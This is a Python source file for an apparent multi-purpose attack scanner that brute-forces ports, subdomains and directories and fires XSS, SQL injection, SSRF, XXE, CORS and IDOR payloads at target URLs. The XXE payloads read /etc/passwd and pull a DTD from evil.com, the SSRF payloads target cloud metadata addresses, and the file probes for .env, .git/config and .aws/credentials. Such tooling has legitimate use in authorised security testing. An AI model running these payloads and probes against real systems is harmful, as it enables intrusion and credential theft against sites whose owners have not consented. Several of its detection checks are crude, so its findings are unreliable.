#!/usr/bin/env python3
import socket
import requests
import re
import subprocess
import concurrent.futures
from urllib.parse import urlparse, parse_qs, urlencode
from typing import Dict, List, Optional, Any
from dataclasses import dataclass

@dataclass
class ScanResult:
    target: str
    vuln_type: str
    severity: str
    evidence: str
    payload: str
    confident: float

class NetworkScanner:
    def __init__(self, timeout: int = 10):
        self.timeout = timeout
        self.common_ports = [
            (21, "ftp"), (22, "ssh"), (23, "telnet"), (25, "smtp"),
            (53, "dns"), (80, "http"), (110, "pop3"), (143, "imap"),
            (443, "https"), (445, "smb"), (993, "imaps"), (995, "pop3s"),
            (3306, "mysql"), (3389, "rdp"), (5432, "postgres"),
            (5900, "vnc"), (6379, "redis"), (8080, "http-proxy"),
            (8443, "https-alt"), (27017, "mongodb")
        ]
        
    def scan_ports(self, host: str, ports: List[int] = None, 
                  threads: int = 50) -> Dict:
        if ports is None:
            ports = [p for p, _ in self.common_ports]
            
        open_ports = []
        
        def check_port(port):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((host, port))
            sock.close()
            return port if result == 0 else None
            
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            results = executor.map(check_port, ports)
            open_ports = [r for r in results if r]
            
        services = []
        for port in open_ports:
            for p, name in self.common_ports:
                if p == port:
                    services.append({"port": port, "service": name})
                    break
                    
        return {
            "host": host,
            "open_ports": open_ports,
            "services": services,
            "scan_time": "now"
        }
        
    def scan_nmap(self, target: str, scan_type: str = "-sV") -> Dict:
        try:
            result = subprocess.run(
                ["nmap", scan_type, "-T4", target],
                capture_output=True, text=True, timeout=300
            )
            return {"output": result.stdout, "error": result.stderr}
        except FileNotFoundError:
            return {"error": "nmap not installed", "install": "apt install nmap"}
        except Exception as e:
            return {"error": str(e)}
            
    def grab_banner(self, host: str, port: int) -> Optional[str]:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((host, port))
            sock.send(b"HEAD / HTTP/1.0\r\n\r\n")
            banner = sock.recv(1024).decode().split("\r\n")[0]
            sock.close()
            return banner
        except:
            return None
            
class WebScanner:
    def __init__(self, timeout: int = 10):
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        })
        
    def scan_xss(self, url: str, params: Dict = None) -> List[ScanResult]:
        xss_payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "javascript:alert(1)",
            "<body onload=alert(1)>",
            "\"><img src=x onerror=alert(1)>",
            "'-alert(1)-'",
            "\"><script>alert(1)</script>"
        ]
        
        findings = []
        parsed = urlparse(url)
        qparams = parse_qs(parsed.query) if parsed.query else {}
        
        target_params = params or qparams
        
        for param in target_params.keys():
            for payload in xss_payloads:
                try:
                    test_params = target_params.copy()
                    test_params[param] = payload
                    
                    if parsed.query:
                        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params)}"
                    else:
                        test_url = url
                        
                    resp = self.session.get(test_url, timeout=self.timeout, verify=False)
                    
                    if payload in resp.text:
                        findings.append(ScanResult(
                            target=url,
                            vuln_type="XSS",
                            severity="HIGH",
                            evidence=f"Reflected parameter: {param}",
                            payload=payload,
                            confident=0.9
                        ))
                        break
                except:
                    pass
                    
        return findings
        
    def scan_sqli(self, url: str, params: Dict = None) -> List[ScanResult]:
        sqli_payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "1' AND '1'='1",
            "' UNION SELECT NULL--",
            "1'; WAITFOR DELAY '00:00:05'--",
            "' OR 1=1--",
            "' OR 'a'='a",
            "1' AND SLEEP(5)--"
        ]
        
        findings = []
        parsed = urlparse(url)
        qparams = parse_qs(parsed.query) if parsed.query else {}
        target_params = params or qparams
        
        for param in target_params.keys():
            for payload in sqli_payloads:
                try:
                    test_params = target_params.copy()
                    test_params[param] = payload
                    
                    if parsed.query:
                        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params)}"
                    else:
                        test_url = url
                        
                    resp = self.session.get(test_url, timeout=self.timeout, verify=False)
                    
                    error_keywords = ["sql", "syntax", "mysql", "oracle", "postgresql", 
                                   "sqlite", "warning", "division by zero"]
                    if any(kw in resp.text.lower() for kw in error_keywords):
                        findings.append(ScanResult(
                            target=url,
                            vuln_type="SQLi",
                            severity="CRITICAL",
                            evidence=f"SQL error in parameter: {param}",
                            payload=payload,
                            confident=0.85
                        ))
                except:
                    pass
                    
        return findings
        
    def scan_ssrf(self, url: str, param: str = "url") -> List[ScanResult]:
        ssrf_payloads = [
            "http://localhost",
            "http://127.0.0.1",
            "http://169.254.169.254",
            "http://metadata.google.internal"
        ]
        
        findings = []
        
        for payload in ssrf_payloads:
            try:
                params = {param: payload}
                resp = self.session.get(url, params=params, timeout=self.timeout, verify=False)
                
                if "localhost" in resp.text or "127.0.0.1" in resp.text:
                    findings.append(ScanResult(
                        target=url,
                        vuln_type="SSRF",
                        severity="HIGH",
                        evidence=f"Internal access via {param}",
                        payload=payload,
                        confident=0.7
                    ))
            except:
                pass
                
        return findings
        
    def scan_xxe(self, url: str) -> List[ScanResult]:
        xxe_payloads = [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/evil.dtd">]><foo>&xxe;</foo>'
        ]
        
        findings = []
        
        for payload in xxe_payloads:
            try:
                headers = {"Content-Type": "application/xml"}
                resp = self.session.post(url, data=payload, headers=headers, 
                                   timeout=self.timeout, verify=False)
                
                if "root:" in resp.text or "SYSTEM" in resp.text:
                    findings.append(ScanResult(
                        target=url,
                        vuln_type="XXE",
                        severity="HIGH",
                        evidence="XML External Entity detected",
                        payload=payload[:50],
                        confident=0.8
                    ))
            except:
                pass
                
        return findings
        
    def scan_idor(self, url: str, id_param: str = "id") -> List[ScanResult]:
        findings = []
        
        for i in range(1, 20):
            try:
                params = {id_param: str(i)}
                resp = self.session.get(url, params=params, timeout=self.timeout, verify=False)
                
                if resp.status_code == 200:
                    findings.append(ScanResult(
                        target=url,
                        vuln_type="IDOR",
                        severity="MEDIUM",
                        evidence=f"Accessed object ID: {i}",
                        payload=str(i),
                        confident=0.6
                    ))
            except:
                pass
                
        return findings
        
    def scan_cors(self, url: str) -> List[ScanResult]:
        findings = []
        
        headers = {"Origin": "https://evil.com"}
        try:
            resp = self.session.get(url, headers=headers, timeout=self.timeout, verify=False)
            acao = resp.headers.get("Access-Control-Allow-Origin")
            
            if acao in ["*", "https://evil.com"]:
                findings.append(ScanResult(
                    target=url,
                    vuln_type="CORS",
                    severity="MEDIUM",
                    evidence=f"ACAO: {acao}",
                    payload="Origin: https://evil.com",
                    confident=0.9
                ))
        except:
            pass
            
        return findings
        
    def scan_sensitive_files(self, url: str) -> List[ScanResult]:
        sensitive_paths = [
            "/.git/config", "/.env", "/wp-config.php", "/config.php",
            "/admin.php", "/phpinfo.php", "/server-status",
            "/.DS_Store", "/backup.zip", "/Database.sql",
            "/api/config", "/.aws/credentials", "/.svn/entries",
            "/debug", "/actuator/env", "/heapdump"
        ]
        
        findings = []
        
        for path in sensitive_paths:
            try:
                full_url = f"{url.rstrip('/')}/{path.lstrip('/')}"
                resp = self.session.get(full_url, timeout=5, verify=False)
                
                if resp.status_code == 200 and len(resp.text) > 0:
                    if any(s in resp.text.lower() for s in ["password", "key", "secret", 
                                                     "database", "root:", "api_key"]):
                        findings.append(ScanResult(
                            target=url,
                            vuln_type="SENSITIVE_FILE",
                            severity="HIGH",
                            evidence=f"Exposed: {path}",
                            payload=path,
                            confident=0.9
                        ))
            except:
                pass
                
        return findings
        
    def full_scan(self, url: str) -> Dict:
        all_findings = []
        
        all_findings.extend(self.scan_xss(url))
        all_findings.extend(self.scan_sqli(url))
        all_findings.extend(self.scan_ssrf(url))
        all_findings.extend(self.scan_cors(url))
        all_findings.extend(self.scan_sensitive_files(url))
        
        return {
            "target": url,
            "findings": [
                {"type": f.vuln_type, "severity": f.severity, 
                 "evidence": f.evidence, "payload": f.payload}
                for f in all_findings
            ],
            "count": len(all_findings)
        }
        
class SubdomainScanner:
    def __init__(self):
        self.subdomains = [
            "www", "mail", "ftp", "localhost", "webmail", "smtp", "pop", "ns1",
            "webdisk", "ns2", "cpanel", "whm", "autodiscover", "autoconfig", "m",
            "imap", "test", "ns", "blog", "pop3", "dev", "www2", "admin", "forum",
            "news", "vpn", "shop", "git", "staging", "store", "app", "api", "cdn",
            "static", "assets", "docs", "beta", "old", "lists", "support",
            "mobile", "mx", "search", "dashboard", "cdn2", "gitlab", "jenkins"
        ]
        
    def enumerate(self, domain: str, threads: int = 30) -> List[str]:
        found = []
        
        def check_subdomain(sub):
            try:
                hostname = f"{sub}.{domain}"
                ip = socket.gethostbyname(hostname)
                return hostname, ip
            except:
                return None
                
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            results = executor.map(check_subdomain, self.subdomains)
            
        for r in results:
            if r:
                found.append({"subdomain": r[0], "ip": r[1]})
                
        return found
        
class DirScanner:
    def __init__(self, timeout: int = 10):
        self.timeout = timeout
        self.session = requests.Session()
        self.wordlists = {
            "common": [
                "admin", "login", "dashboard", "config", "api", "backup",
                "test", "dev", "staging", "wp-admin", "phpmyadmin",
                ".git", ".svn", "server-status", "actuator"
            ],
            "sensitive": [
                ".env", ".aws", "credentials", "secrets", "keys", "passwords",
                "database.sql", "dump.sql", "backup.sql", ".htaccess"
            ]
        }
        
    def scan(self, url: str, wordlist: str = "common") -> Dict:
        found = []
        
        for path in self.wordlists.get(wordlist, self.wordlists["common"]):
            try:
                full_url = f"{url.rstrip('/')}/{path}"
                resp = self.session.get(full_url, timeout=self.timeout, verify=False)
                
                if resp.status_code == 200:
                    found.append({"path": path, "status": resp.status_code})
                elif resp.status_code == 401:
                    found.append({"path": path, "status": "protected"})
            except:
                pass
                
        return {"url": url, "found": found, "count": len(found)}


network_scanner = NetworkScanner()
web_scanner = WebScanner()
subdomain_scanner = SubdomainScanner()
dir_scanner = DirScanner()